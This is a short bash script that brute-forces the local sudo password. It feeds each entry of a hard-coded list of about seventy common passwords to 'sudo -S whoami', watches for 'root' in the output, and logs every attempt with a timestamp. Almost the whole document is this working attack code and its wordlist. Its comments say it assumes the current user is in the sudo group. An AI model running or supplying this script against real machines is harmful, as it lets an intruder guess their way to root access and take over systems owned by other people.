#!/bin/bash

# This script loops through the PASSWORDS array passing each P -> password as
# --stdin to the "sudo whoami" command, then checks the resulting output for the 
# username root to discover if the sudo command was passed the correct password 
# or not. Note: It assumes that the current user is a member of the sudo or 
# wheel group and can run sudo commands if the correct password is given. 

# Manual testing
# :~$ P="one"; sudo -k && echo "$P" |sudo -S whoami
#   [sudo] password for {username}: Sorry, try again.
#   [sudo] password for {username}: 
#   sudo: no password was provided
#   sudo: 1 incorrect password attempt
# :~$ P="password123"; sudo -k && echo "$P" |sudo -S whoami
#   [sudo] password for {username}: root

PASSWORDS=(123456
password
123456789
12345678
qwerty
abc123
letmein
monkey
iloveyou
12345
qwertyuiop
asdfghjkl
zxcvbnm
1q2w3e4r
qweasd
john1987
sarah1990
michael123
emily2000
david1995
starwars
batman123
pokemon
netflix123
cocaCola
Passw0rd
Admin123
User@123
Welcome1
P@ssw0rd
sunshine
football
superman
chocolate
summer2023
a1b2c3
x9z8y7
k4l5m6
p0q9r8
p@ssw0rd
h@ck3r
5ecur1ty
adm1n!23
t3st!ng
winter2024
Spring!23
Football#1
123abcXYZ
passw@rd123
letmein2023
Qwerty@123
h4ckme
secureme@!
hunter2
root123
!qaz@wsx
qazwsx123
1234abcd
abcd@1234
admin1
Super#Secure
P@55w0rd!
ILove$Cats
Techy2023#
Pa$$w0rd2024
Cyber!2024
L3tM31n!
Tr0ub13#Maker
S3cur3Mypc!
G0Ph1sh1ng
W1nT3rIsC0m1ng
P4ssw0rd$Rul3s
T3rr4F0rm2023
Us3rN@m3P@ss
)
touch /tmp/temp_file
for P in ${PASSWORDS[@]}
do
    sudo -k && echo "$P" |sudo -S whoami &>/tmp/temp_file
    if grep --quiet "root" /tmp/temp_file
    then 
        echo "$(date +'%Y-%m-%dT%T%Z') exit: $? FOUND: sudo => $P"
        break
    else 
        echo "$(date +'%Y-%m-%dT%T%Z') exit: $? TRIED: $P"
    fi
    sleep 2
done
rm /tmp/temp_file